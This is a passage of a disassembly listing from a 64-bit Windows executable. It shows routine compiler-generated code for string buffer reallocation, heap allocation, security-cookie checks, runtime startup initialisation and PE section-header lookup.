   140008049:	48 89 3e             	mov    %rdi,(%rsi)
   14000804c:	48 8b c6             	mov    %rsi,%rax
   14000804f:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   140008054:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140008059:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   14000805e:	48 83 c4 38          	add    $0x38,%rsp
   140008062:	41 5f                	pop    %r15
   140008064:	5e                   	pop    %rsi
   140008065:	5d                   	pop    %rbp
   140008066:	5b                   	pop    %rbx
   140008067:	c3                   	ret
   140008068:	e8 53 94 ff ff       	call   0x1400014c0
   14000806d:	cc                   	int3
   14000806e:	e8 ad 93 ff ff       	call   0x140001420
   140008073:	cc                   	int3
   140008074:	cc                   	int3
   140008075:	cc                   	int3
   140008076:	cc                   	int3
   140008077:	cc                   	int3
   140008078:	cc                   	int3
   140008079:	cc                   	int3
   14000807a:	cc                   	int3
   14000807b:	cc                   	int3
   14000807c:	cc                   	int3
   14000807d:	cc                   	int3
   14000807e:	cc                   	int3
   14000807f:	cc                   	int3
   140008080:	40 53                	rex push %rbx
   140008082:	55                   	push   %rbp
   140008083:	56                   	push   %rsi
   140008084:	48 83 ec 40          	sub    $0x40,%rsp
   140008088:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000808c:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140008093:	ff ff 7f 
   140008096:	48 8b c3             	mov    %rbx,%rax
   140008099:	48 8b f1             	mov    %rcx,%rsi
   14000809c:	48 2b c5             	sub    %rbp,%rax
   14000809f:	48 3b c2             	cmp    %rdx,%rax
   1400080a2:	0f 82 6d 01 00 00    	jb     0x140008215
   1400080a8:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   1400080ad:	4c 89 64 24 78       	mov    %r12,0x78(%rsp)
   1400080b2:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400080b7:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400080bb:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400080c0:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   1400080c4:	49 8b d7             	mov    %r15,%rdx
   1400080c7:	48 83 ca 0f          	or     $0xf,%rdx
   1400080cb:	48 3b d3             	cmp    %rbx,%rdx
   1400080ce:	77 44                	ja     0x140008114
   1400080d0:	49 8b ce             	mov    %r14,%rcx
   1400080d3:	48 8b c3             	mov    %rbx,%rax
   1400080d6:	48 d1 e9             	shr    $1,%rcx
   1400080d9:	48 2b c1             	sub    %rcx,%rax
   1400080dc:	4c 3b f0             	cmp    %rax,%r14
   1400080df:	77 33                	ja     0x140008114
   1400080e1:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   1400080e5:	48 8b da             	mov    %rdx,%rbx
   1400080e8:	48 3b d0             	cmp    %rax,%rdx
   1400080eb:	48 0f 42 d8          	cmovb  %rax,%rbx
   1400080ef:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400080f3:	48 85 c9             	test   %rcx,%rcx
   1400080f6:	75 04                	jne    0x1400080fc
   1400080f8:	33 ff                	xor    %edi,%edi
   1400080fa:	eb 4d                	jmp    0x140008149
   1400080fc:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140008103:	72 3c                	jb     0x140008141
   140008105:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140008109:	48 3b c1             	cmp    %rcx,%rax
   14000810c:	0f 86 09 01 00 00    	jbe    0x14000821b
   140008112:	eb 0e                	jmp    0x140008122
   140008114:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000811b:	00 00 80 
   14000811e:	48 83 c0 27          	add    $0x27,%rax
   140008122:	48 8b c8             	mov    %rax,%rcx
   140008125:	e8 56 04 00 00       	call   0x140008580
   14000812a:	48 85 c0             	test   %rax,%rax
   14000812d:	0f 84 87 00 00 00    	je     0x1400081ba
   140008133:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140008137:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   14000813b:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000813f:	eb 08                	jmp    0x140008149
   140008141:	e8 3a 04 00 00       	call   0x140008580
   140008146:	48 8b f8             	mov    %rax,%rdi
   140008149:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140008150:	00 
   140008151:	4c 8b c5             	mov    %rbp,%r8
   140008154:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   140008158:	4c 8d 3c 2f          	lea    (%rdi,%rbp,1),%r15
   14000815c:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140008160:	48 8b cf             	mov    %rdi,%rcx
   140008163:	49 83 fe 0f          	cmp    $0xf,%r14
   140008167:	76 6b                	jbe    0x1400081d4
   140008169:	48 8b 1e             	mov    (%rsi),%rbx
   14000816c:	48 8b d3             	mov    %rbx,%rdx
   14000816f:	e8 77 13 00 00       	call   0x1400094eb
   140008174:	4d 8b c4             	mov    %r12,%r8
   140008177:	48 8d 15 d2 67 00 00 	lea    0x67d2(%rip),%rdx        # 0x14000e950
   14000817e:	49 8b cf             	mov    %r15,%rcx
   140008181:	e8 65 13 00 00       	call   0x1400094eb
   140008186:	49 8d 56 01          	lea    0x1(%r14),%rdx
   14000818a:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   14000818f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140008196:	72 18                	jb     0x1400081b0
   140008198:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   14000819c:	48 83 c2 27          	add    $0x27,%rdx
   1400081a0:	48 2b d8             	sub    %rax,%rbx
   1400081a3:	48 83 eb 08          	sub    $0x8,%rbx
   1400081a7:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400081ab:	77 0d                	ja     0x1400081ba
   1400081ad:	48 8b d8             	mov    %rax,%rbx
   1400081b0:	48 8b cb             	mov    %rbx,%rcx
   1400081b3:	e8 44 06 00 00       	call   0x1400087fc
   1400081b8:	eb 39                	jmp    0x1400081f3
   1400081ba:	45 33 c9             	xor    %r9d,%r9d
   1400081bd:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400081c4:	00 00 
   1400081c6:	45 33 c0             	xor    %r8d,%r8d
   1400081c9:	33 d2                	xor    %edx,%edx
   1400081cb:	33 c9                	xor    %ecx,%ecx
   1400081cd:	ff 15 45 31 00 00    	call   *0x3145(%rip)        # 0x14000b318
   1400081d3:	cc                   	int3
   1400081d4:	48 8b d6             	mov    %rsi,%rdx
   1400081d7:	e8 0f 13 00 00       	call   0x1400094eb
   1400081dc:	4d 8b c4             	mov    %r12,%r8
   1400081df:	48 8d 15 6a 67 00 00 	lea    0x676a(%rip),%rdx        # 0x14000e950
   1400081e6:	49 8b cf             	mov    %r15,%rcx
   1400081e9:	e8 fd 12 00 00       	call   0x1400094eb
   1400081ee:	43 c6 04 27 00       	movb   $0x0,(%r15,%r12,1)
   1400081f3:	48 89 3e             	mov    %rdi,(%rsi)
   1400081f6:	48 8b c6             	mov    %rsi,%rax
   1400081f9:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   1400081fe:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140008203:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140008208:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   14000820d:	48 83 c4 40          	add    $0x40,%rsp
   140008211:	5e                   	pop    %rsi
   140008212:	5d                   	pop    %rbp
   140008213:	5b                   	pop    %rbx
   140008214:	c3                   	ret
   140008215:	e8 a6 92 ff ff       	call   0x1400014c0
   14000821a:	cc                   	int3
   14000821b:	e8 00 92 ff ff       	call   0x140001420
   140008220:	cc                   	int3
   140008221:	cc                   	int3
   140008222:	cc                   	int3
   140008223:	cc                   	int3
   140008224:	cc                   	int3
   140008225:	cc                   	int3
   140008226:	cc                   	int3
   140008227:	cc                   	int3
   140008228:	cc                   	int3
   140008229:	cc                   	int3
   14000822a:	cc                   	int3
   14000822b:	cc                   	int3
   14000822c:	cc                   	int3
   14000822d:	cc                   	int3
   14000822e:	cc                   	int3
   14000822f:	cc                   	int3
   140008230:	48 83 ec 28          	sub    $0x28,%rsp
   140008234:	48 8b 11             	mov    (%rcx),%rdx
   140008237:	48 8b 02             	mov    (%rdx),%rax
   14000823a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000823e:	48 8b 4c 11 48       	mov    0x48(%rcx,%rdx,1),%rcx
   140008243:	48 85 c9             	test   %rcx,%rcx
   140008246:	74 07                	je     0x14000824f
   140008248:	48 8b 01             	mov    (%rcx),%rax
   14000824b:	ff 50 10             	call   *0x10(%rax)
   14000824e:	90                   	nop
   14000824f:	48 83 c4 28          	add    $0x28,%rsp
   140008253:	c3                   	ret
   140008254:	cc                   	int3
   140008255:	cc                   	int3
   140008256:	cc                   	int3
   140008257:	cc                   	int3
   140008258:	cc                   	int3
   140008259:	cc                   	int3
   14000825a:	cc                   	int3
   14000825b:	cc                   	int3
   14000825c:	cc                   	int3
   14000825d:	cc                   	int3
   14000825e:	cc                   	int3
   14000825f:	cc                   	int3
   140008260:	40 53                	rex push %rbx
   140008262:	55                   	push   %rbp
   140008263:	56                   	push   %rsi
   140008264:	41 54                	push   %r12
   140008266:	48 83 ec 38          	sub    $0x38,%rsp
   14000826a:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000826e:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140008275:	ff ff 7f 
   140008278:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   14000827f:	00 
   140008280:	48 8b c3             	mov    %rbx,%rax
   140008283:	48 2b c5             	sub    %rbp,%rax
   140008286:	48 8b f1             	mov    %rcx,%rsi
   140008289:	48 3b c2             	cmp    %rdx,%rax
   14000828c:	0f 82 4b 01 00 00    	jb     0x1400083dd
   140008292:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140008297:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   14000829c:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400082a0:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400082a5:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   1400082a9:	49 8b d7             	mov    %r15,%rdx
   1400082ac:	48 83 ca 0f          	or     $0xf,%rdx
   1400082b0:	48 3b d3             	cmp    %rbx,%rdx
   1400082b3:	77 44                	ja     0x1400082f9
   1400082b5:	49 8b ce             	mov    %r14,%rcx
   1400082b8:	48 8b c3             	mov    %rbx,%rax
   1400082bb:	48 d1 e9             	shr    $1,%rcx
   1400082be:	48 2b c1             	sub    %rcx,%rax
   1400082c1:	4c 3b f0             	cmp    %rax,%r14
   1400082c4:	77 33                	ja     0x1400082f9
   1400082c6:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   1400082ca:	48 8b da             	mov    %rdx,%rbx
   1400082cd:	48 3b d0             	cmp    %rax,%rdx
   1400082d0:	48 0f 42 d8          	cmovb  %rax,%rbx
   1400082d4:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400082d8:	48 85 c9             	test   %rcx,%rcx
   1400082db:	75 04                	jne    0x1400082e1
   1400082dd:	33 ff                	xor    %edi,%edi
   1400082df:	eb 49                	jmp    0x14000832a
   1400082e1:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400082e8:	72 38                	jb     0x140008322
   1400082ea:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400082ee:	48 3b c1             	cmp    %rcx,%rax
   1400082f1:	0f 86 ec 00 00 00    	jbe    0x1400083e3
   1400082f7:	eb 0e                	jmp    0x140008307
   1400082f9:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   140008300:	00 00 80 
   140008303:	48 83 c0 27          	add    $0x27,%rax
   140008307:	48 8b c8             	mov    %rax,%rcx
   14000830a:	e8 71 02 00 00       	call   0x140008580
   14000830f:	48 85 c0             	test   %rax,%rax
   140008312:	74 7c                	je     0x140008390
   140008314:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140008318:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   14000831c:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140008320:	eb 08                	jmp    0x14000832a
   140008322:	e8 59 02 00 00       	call   0x140008580
   140008327:	48 8b f8             	mov    %rax,%rdi
   14000832a:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
   140008331:	00 
   140008332:	49 8b d4             	mov    %r12,%rdx
   140008335:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   140008339:	48 8b cf             	mov    %rdi,%rcx
   14000833c:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140008340:	4e 8d 3c 07          	lea    (%rdi,%r8,1),%r15
   140008344:	49 83 fe 0f          	cmp    $0xf,%r14
   140008348:	76 60                	jbe    0x1400083aa
   14000834a:	48 8b 1e             	mov    (%rsi),%rbx
   14000834d:	e8 99 11 00 00       	call   0x1400094eb
   140008352:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   140008356:	48 8b d3             	mov    %rbx,%rdx
   140008359:	49 8b cf             	mov    %r15,%rcx
   14000835c:	e8 8a 11 00 00       	call   0x1400094eb
   140008361:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140008365:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000836c:	72 18                	jb     0x140008386
   14000836e:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140008372:	48 83 c2 27          	add    $0x27,%rdx
   140008376:	48 2b d8             	sub    %rax,%rbx
   140008379:	48 83 eb 08          	sub    $0x8,%rbx
   14000837d:	48 83 fb 1f          	cmp    $0x1f,%rbx
   140008381:	77 0d                	ja     0x140008390
   140008383:	48 8b d8             	mov    %rax,%rbx
   140008386:	48 8b cb             	mov    %rbx,%rcx
   140008389:	e8 6e 04 00 00       	call   0x1400087fc
   14000838e:	eb 2e                	jmp    0x1400083be
   140008390:	45 33 c9             	xor    %r9d,%r9d
   140008393:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000839a:	00 00 
   14000839c:	45 33 c0             	xor    %r8d,%r8d
   14000839f:	33 d2                	xor    %edx,%edx
   1400083a1:	33 c9                	xor    %ecx,%ecx
   1400083a3:	ff 15 6f 2f 00 00    	call   *0x2f6f(%rip)        # 0x14000b318
   1400083a9:	cc                   	int3
   1400083aa:	e8 3c 11 00 00       	call   0x1400094eb
   1400083af:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   1400083b3:	48 8b d6             	mov    %rsi,%rdx
   1400083b6:	49 8b cf             	mov    %r15,%rcx
   1400083b9:	e8 2d 11 00 00       	call   0x1400094eb
   1400083be:	48 89 3e             	mov    %rdi,(%rsi)
   1400083c1:	48 8b c6             	mov    %rsi,%rax
   1400083c4:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   1400083c9:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   1400083ce:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   1400083d3:	48 83 c4 38          	add    $0x38,%rsp
   1400083d7:	41 5c                	pop    %r12
   1400083d9:	5e                   	pop    %rsi
   1400083da:	5d                   	pop    %rbp
   1400083db:	5b                   	pop    %rbx
   1400083dc:	c3                   	ret
   1400083dd:	e8 de 90 ff ff       	call   0x1400014c0
   1400083e2:	cc                   	int3
   1400083e3:	e8 38 90 ff ff       	call   0x140001420
   1400083e8:	cc                   	int3
   1400083e9:	cc                   	int3
   1400083ea:	cc                   	int3
   1400083eb:	cc                   	int3
   1400083ec:	cc                   	int3
   1400083ed:	cc                   	int3
   1400083ee:	cc                   	int3
   1400083ef:	cc                   	int3
   1400083f0:	40 53                	rex push %rbx
   1400083f2:	55                   	push   %rbp
   1400083f3:	56                   	push   %rsi
   1400083f4:	41 57                	push   %r15
   1400083f6:	48 83 ec 38          	sub    $0x38,%rsp
   1400083fa:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140008401:	ff ff 7f 
   140008404:	4d 8b f9             	mov    %r9,%r15
   140008407:	48 8b ea             	mov    %rdx,%rbp
   14000840a:	48 8b f1             	mov    %rcx,%rsi
   14000840d:	48 3b d3             	cmp    %rbx,%rdx
   140008410:	0f 87 10 01 00 00    	ja     0x140008526
   140008416:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000841b:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140008420:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140008424:	48 8b ca             	mov    %rdx,%rcx
   140008427:	48 83 c9 0f          	or     $0xf,%rcx
   14000842b:	48 3b cb             	cmp    %rbx,%rcx
   14000842e:	77 44                	ja     0x140008474
   140008430:	49 8b d6             	mov    %r14,%rdx
   140008433:	48 8b c3             	mov    %rbx,%rax
   140008436:	48 d1 ea             	shr    $1,%rdx
   140008439:	48 2b c2             	sub    %rdx,%rax
   14000843c:	4c 3b f0             	cmp    %rax,%r14
   14000843f:	77 33                	ja     0x140008474
   140008441:	49 8d 04 16          	lea    (%r14,%rdx,1),%rax
   140008445:	48 8b d9             	mov    %rcx,%rbx
   140008448:	48 3b c8             	cmp    %rax,%rcx
   14000844b:	48 0f 42 d8          	cmovb  %rax,%rbx
   14000844f:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140008453:	48 85 c9             	test   %rcx,%rcx
   140008456:	75 04                	jne    0x14000845c
   140008458:	33 ff                	xor    %edi,%edi
   14000845a:	eb 49                	jmp    0x1400084a5
   14000845c:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140008463:	72 38                	jb     0x14000849d
   140008465:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140008469:	48 3b c1             	cmp    %rcx,%rax
   14000846c:	0f 86 ba 00 00 00    	jbe    0x14000852c
   140008472:	eb 0e                	jmp    0x140008482
   140008474:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000847b:	00 00 80 
   14000847e:	48 83 c0 27          	add    $0x27,%rax
   140008482:	48 8b c8             	mov    %rax,%rcx
   140008485:	e8 f6 00 00 00       	call   0x140008580
   14000848a:	48 85 c0             	test   %rax,%rax
   14000848d:	74 7d                	je     0x14000850c
   14000848f:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140008493:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140008497:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000849b:	eb 08                	jmp    0x1400084a5
   14000849d:	e8 de 00 00 00       	call   0x140008580
   1400084a2:	48 8b f8             	mov    %rax,%rdi
   1400084a5:	4c 8b c5             	mov    %rbp,%r8
   1400084a8:	48 89 6e 10          	mov    %rbp,0x10(%rsi)
   1400084ac:	49 8b d7             	mov    %r15,%rdx
   1400084af:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400084b3:	48 8b cf             	mov    %rdi,%rcx
   1400084b6:	e8 30 10 00 00       	call   0x1400094eb
   1400084bb:	c6 04 2f 00          	movb   $0x0,(%rdi,%rbp,1)
   1400084bf:	49 83 fe 0f          	cmp    $0xf,%r14
   1400084c3:	76 2d                	jbe    0x1400084f2
   1400084c5:	48 8b 0e             	mov    (%rsi),%rcx
   1400084c8:	49 8d 56 01          	lea    0x1(%r14),%rdx
   1400084cc:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400084d3:	72 18                	jb     0x1400084ed
   1400084d5:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400084d9:	48 83 c2 27          	add    $0x27,%rdx
   1400084dd:	48 2b c8             	sub    %rax,%rcx
   1400084e0:	48 83 e9 08          	sub    $0x8,%rcx
   1400084e4:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400084e8:	77 22                	ja     0x14000850c
   1400084ea:	48 8b c8             	mov    %rax,%rcx
   1400084ed:	e8 0a 03 00 00       	call   0x1400087fc
   1400084f2:	48 89 3e             	mov    %rdi,(%rsi)
   1400084f5:	48 8b c6             	mov    %rsi,%rax
   1400084f8:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   1400084fd:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   140008502:	48 83 c4 38          	add    $0x38,%rsp
   140008506:	41 5f                	pop    %r15
   140008508:	5e                   	pop    %rsi
   140008509:	5d                   	pop    %rbp
   14000850a:	5b                   	pop    %rbx
   14000850b:	c3                   	ret
   14000850c:	45 33 c9             	xor    %r9d,%r9d
   14000850f:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140008516:	00 00 
   140008518:	45 33 c0             	xor    %r8d,%r8d
   14000851b:	33 d2                	xor    %edx,%edx
   14000851d:	33 c9                	xor    %ecx,%ecx
   14000851f:	ff 15 f3 2d 00 00    	call   *0x2df3(%rip)        # 0x14000b318
   140008525:	cc                   	int3
   140008526:	e8 95 8f ff ff       	call   0x1400014c0
   14000852b:	cc                   	int3
   14000852c:	e8 ef 8e ff ff       	call   0x140001420
   140008531:	cc                   	int3
   140008532:	cc                   	int3
   140008533:	cc                   	int3
   140008534:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140008538:	48 2b c8             	sub    %rax,%rcx
   14000853b:	e9 b0 f1 ff ff       	jmp    0x1400076f0
   140008540:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140008544:	48 2b c8             	sub    %rax,%rcx
   140008547:	e9 74 f2 ff ff       	jmp    0x1400077c0
   14000854c:	cc                   	int3
   14000854d:	cc                   	int3
   14000854e:	cc                   	int3
   14000854f:	cc                   	int3
   140008550:	cc                   	int3
   140008551:	cc                   	int3
   140008552:	cc                   	int3
   140008553:	cc                   	int3
   140008554:	cc                   	int3
   140008555:	cc                   	int3
   140008556:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000855d:	00 00 00 
   140008560:	48 3b 0d d9 9a 00 00 	cmp    0x9ad9(%rip),%rcx        # 0x140012040
   140008567:	75 10                	jne    0x140008579
   140008569:	48 c1 c1 10          	rol    $0x10,%rcx
   14000856d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140008572:	75 01                	jne    0x140008575
   140008574:	c3                   	ret
   140008575:	48 c1 c9 10          	ror    $0x10,%rcx
   140008579:	e9 5a 05 00 00       	jmp    0x140008ad8
   14000857e:	cc                   	int3
   14000857f:	cc                   	int3
   140008580:	40 53                	rex push %rbx
   140008582:	48 83 ec 20          	sub    $0x20,%rsp
   140008586:	48 8b d9             	mov    %rcx,%rbx
   140008589:	eb 0f                	jmp    0x14000859a
   14000858b:	48 8b cb             	mov    %rbx,%rcx
   14000858e:	e8 5e 0f 00 00       	call   0x1400094f1
   140008593:	85 c0                	test   %eax,%eax
   140008595:	74 13                	je     0x1400085aa
   140008597:	48 8b cb             	mov    %rbx,%rcx
   14000859a:	e8 58 0f 00 00       	call   0x1400094f7
   14000859f:	48 85 c0             	test   %rax,%rax
   1400085a2:	74 e7                	je     0x14000858b
   1400085a4:	48 83 c4 20          	add    $0x20,%rsp
   1400085a8:	5b                   	pop    %rbx
   1400085a9:	c3                   	ret
   1400085aa:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1400085ae:	74 06                	je     0x1400085b6
   1400085b0:	e8 8f 06 00 00       	call   0x140008c44
   1400085b5:	cc                   	int3
   1400085b6:	e8 65 8e ff ff       	call   0x140001420
   1400085bb:	cc                   	int3
   1400085bc:	48 83 ec 28          	sub    $0x28,%rsp
   1400085c0:	e8 3f 09 00 00       	call   0x140008f04
   1400085c5:	85 c0                	test   %eax,%eax
   1400085c7:	74 21                	je     0x1400085ea
   1400085c9:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400085d0:	00 00 
   1400085d2:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400085d6:	eb 05                	jmp    0x1400085dd
   1400085d8:	48 3b c8             	cmp    %rax,%rcx
   1400085db:	74 14                	je     0x1400085f1
   1400085dd:	33 c0                	xor    %eax,%eax
   1400085df:	f0 48 0f b1 0d 00 e2 	lock cmpxchg %rcx,0x1e200(%rip)        # 0x1400267e8
   1400085e6:	01 00 
   1400085e8:	75 ee                	jne    0x1400085d8
   1400085ea:	32 c0                	xor    %al,%al
   1400085ec:	48 83 c4 28          	add    $0x28,%rsp
   1400085f0:	c3                   	ret
   1400085f1:	b0 01                	mov    $0x1,%al
   1400085f3:	eb f7                	jmp    0x1400085ec
   1400085f5:	cc                   	int3
   1400085f6:	cc                   	int3
   1400085f7:	cc                   	int3
   1400085f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400085fc:	85 c9                	test   %ecx,%ecx
   1400085fe:	75 07                	jne    0x140008607
   140008600:	c6 05 e9 e1 01 00 01 	movb   $0x1,0x1e1e9(%rip)        # 0x1400267f0
   140008607:	e8 58 06 00 00       	call   0x140008c64
   14000860c:	e8 ff 0b 00 00       	call   0x140009210
   140008611:	84 c0                	test   %al,%al
   140008613:	75 04                	jne    0x140008619
   140008615:	32 c0                	xor    %al,%al
   140008617:	eb 14                	jmp    0x14000862d
   140008619:	e8 f2 0b 00 00       	call   0x140009210
   14000861e:	84 c0                	test   %al,%al
   140008620:	75 09                	jne    0x14000862b
   140008622:	33 c9                	xor    %ecx,%ecx
   140008624:	e8 e7 0b 00 00       	call   0x140009210
   140008629:	eb ea                	jmp    0x140008615
   14000862b:	b0 01                	mov    $0x1,%al
   14000862d:	48 83 c4 28          	add    $0x28,%rsp
   140008631:	c3                   	ret
   140008632:	cc                   	int3
   140008633:	cc                   	int3
   140008634:	40 53                	rex push %rbx
   140008636:	48 83 ec 20          	sub    $0x20,%rsp
   14000863a:	80 3d b0 e1 01 00 00 	cmpb   $0x0,0x1e1b0(%rip)        # 0x1400267f1
   140008641:	8b d9                	mov    %ecx,%ebx
   140008643:	75 67                	jne    0x1400086ac
   140008645:	83 f9 01             	cmp    $0x1,%ecx
   140008648:	77 6a                	ja     0x1400086b4
   14000864a:	e8 b5 08 00 00       	call   0x140008f04
   14000864f:	85 c0                	test   %eax,%eax
   140008651:	74 28                	je     0x14000867b
   140008653:	85 db                	test   %ebx,%ebx
   140008655:	75 24                	jne    0x14000867b
   140008657:	48 8d 0d 9a e1 01 00 	lea    0x1e19a(%rip),%rcx        # 0x1400267f8
   14000865e:	e8 a6 0e 00 00       	call   0x140009509
   140008663:	85 c0                	test   %eax,%eax
   140008665:	75 10                	jne    0x140008677
   140008667:	48 8d 0d a2 e1 01 00 	lea    0x1e1a2(%rip),%rcx        # 0x140026810
   14000866e:	e8 96 0e 00 00       	call   0x140009509
   140008673:	85 c0                	test   %eax,%eax
   140008675:	74 2e                	je     0x1400086a5
   140008677:	32 c0                	xor    %al,%al
   140008679:	eb 33                	jmp    0x1400086ae
   14000867b:	66 0f 6f 05 7d 2e 00 	movdqa 0x2e7d(%rip),%xmm0        # 0x14000b500
   140008682:	00 
   140008683:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140008687:	f3 0f 7f 05 69 e1 01 	movdqu %xmm0,0x1e169(%rip)        # 0x1400267f8
   14000868e:	00 
   14000868f:	48 89 05 72 e1 01 00 	mov    %rax,0x1e172(%rip)        # 0x140026808
   140008696:	f3 0f 7f 05 72 e1 01 	movdqu %xmm0,0x1e172(%rip)        # 0x140026810
   14000869d:	00 
   14000869e:	48 89 05 7b e1 01 00 	mov    %rax,0x1e17b(%rip)        # 0x140026820
   1400086a5:	c6 05 45 e1 01 00 01 	movb   $0x1,0x1e145(%rip)        # 0x1400267f1
   1400086ac:	b0 01                	mov    $0x1,%al
   1400086ae:	48 83 c4 20          	add    $0x20,%rsp
   1400086b2:	5b                   	pop    %rbx
   1400086b3:	c3                   	ret
   1400086b4:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400086b9:	e8 5e 08 00 00       	call   0x140008f1c
   1400086be:	cc                   	int3
   1400086bf:	cc                   	int3
   1400086c0:	48 83 ec 18          	sub    $0x18,%rsp
   1400086c4:	4c 8b c1             	mov    %rcx,%r8
   1400086c7:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400086cc:	66 39 05 2d 79 ff ff 	cmp    %ax,-0x86d3(%rip)        # 0x140000000
   1400086d3:	75 78                	jne    0x14000874d
   1400086d5:	48 63 0d 60 79 ff ff 	movslq -0x86a0(%rip),%rcx        # 0x14000003c
   1400086dc:	48 8d 15 1d 79 ff ff 	lea    -0x86e3(%rip),%rdx        # 0x140000000
   1400086e3:	48 03 ca             	add    %rdx,%rcx
   1400086e6:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400086ec:	75 5f                	jne    0x14000874d
   1400086ee:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400086f3:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400086f7:	75 54                	jne    0x14000874d
   1400086f9:	4c 2b c2             	sub    %rdx,%r8
   1400086fc:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140008700:	48 83 c2 18          	add    $0x18,%rdx
   140008704:	48 03 d1             	add    %rcx,%rdx
   140008707:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000870b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000870f:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140008713:	48 89 14 24          	mov    %rdx,(%rsp)
   140008717:	49 3b d1             	cmp    %r9,%rdx
   14000871a:	74 18                	je     0x140008734
   14000871c:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   14000871f:	4c 3b c1             	cmp    %rcx,%r8
   140008722:	72 0a                	jb     0x14000872e
   140008724:	8b 42 08             	mov    0x8(%rdx),%eax
